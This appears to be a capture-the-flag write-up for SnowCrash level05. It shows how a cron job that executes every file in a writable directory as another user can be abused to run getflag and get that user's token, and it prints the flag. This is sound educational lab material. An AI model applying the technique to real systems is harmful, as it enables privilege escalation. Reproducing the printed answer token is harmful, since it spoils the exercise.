## level05
Upon reaching level05, there are no programs or files in the home directory, so I ran `find / -user flag05 2> /dev/null` to look for any files flag05 owns

And turns out, we got our files
```
level05@SnowCrash:~$ find / -user flag05 2> /dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
level05@SnowCrash:~$
```

The file contents are as follows

```bash=
#!/bin/sh
for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

Which scans the `/opt/openarenaserver/` directory for files and executes everything that is executable inside with a time limit of 5 seconds for each process. The file is then deleted afterwards.

Gave it a sanity check and it works

```
level05@SnowCrash:/dev/shm$ ./openarenaserver
+ echo asdfx
asdfx
```

I tried to run getflag with it, but I had no luck.

when I tried to `ls -lah` the file, I noticed that there is something special in the permission bit:

```
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
```

the + bit at the end of the permission bits means that there are additional permissions set by Access Control Lists (ACL). To get information on those permissions, one can use getfacl command

```
level05@SnowCrash:/dev/shm$     getfacl /usr/sbin/openarenaserver
getfacl: Removing leading '/' from absolute path names
# file: usr/sbin/openarenaserver
# owner: flag05
# group: flag05
user::rwx
user:level05:r--
group::r-x
mask::r-x
other::---
```

Nothing useful here it seems, the only implication i get from doing this is that I cant write to that file.

I was curious and also ran getfacl on the /opt/openarenaserver directory, and got something intresting...

```
# file: opt/openarenaserver/
# owner: root
# group: root
user::rwx
user:level05:rwx
user:flag05:rwx
group::r-x
mask::rwx
other::r-x
default:user::rwx
default:user:level05:rwx
default:user:flag05:rwx
default:group::r-x
default:mask::rwx
default:other::r-x
```

I tried changing the permissions of the directory, but it is not permitted


```
level05@SnowCrash:/dev/shm$ chmod -R 2777 /opt/openarenaserver
chmod: changing permiss    ions of `/opt/openarenaserver': Operation not permitted
```

I also tried changing ownership of the script, but it was also not permitted
```
level05@SnowCrash:/opt/openarenaserver$ ls -lah
total 4.0K
drwxrwxr-x+ 2 root    root    60 Oct 12 05:24 .
drwxr-xr-x  1 root    root    60 Oct 12 03:51 ..
-rwxr-x---+ 1 level05 level05 94 Oct 12 05:24 openarenaserver
level05@SnowCrash:/opt/openarenaserver$ chown flag05 openarenaserver
chown: changing ownership of `openarenaserver': Operation not permitted
level05@SnowCrash:/opt/openarenaserver$
```

After a short break and I logged back in, I noticed that I have new mail 

![](https://hackmd.io/_uploads/Bk08akSZT.png)

and upon reading it, I saw a crontab which runs the openarenaserver script every 2 minutes

```
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

This must be a clue, I made a script that echoes to a file and I waited for 2 minutes, eventually the script did get deleted and the contents did appear in the file I specified.

```
level05@SnowCrash:/opt/openarenaserver$ ls
test.sh
level05@SnowCrash:/opt/openarenaserver$ ls
test.sh
level05@SnowCrash:/opt/openarenaserver$ ls
test.sh
level05@SnowCrash:/opt/openarenaserver$ ls
level05@SnowCrash:/opt/openarenaserver$ cat /dev/shm/hello
asdfg
level05@SnowCrash:/opt/openarenaserver$
```

I replaced the contents of the script with getflag, and the file should have the programs output. And once the script runs and gets deleted, the output should have the flag `viuaaale9huek52boumoomioc`

```
level05@SnowCrash:/opt/openarenaserver$ ls
test.sh
level05@SnowCrash:/opt/openarenaserver$ ls
level05@SnowCrash:/opt/openarenaserver$ cat /dev/shm/hello
Check flag.Here is your token : viuaaale9huek52boumoomioc
level05@SnowCrash:/opt/openarenaserver$
```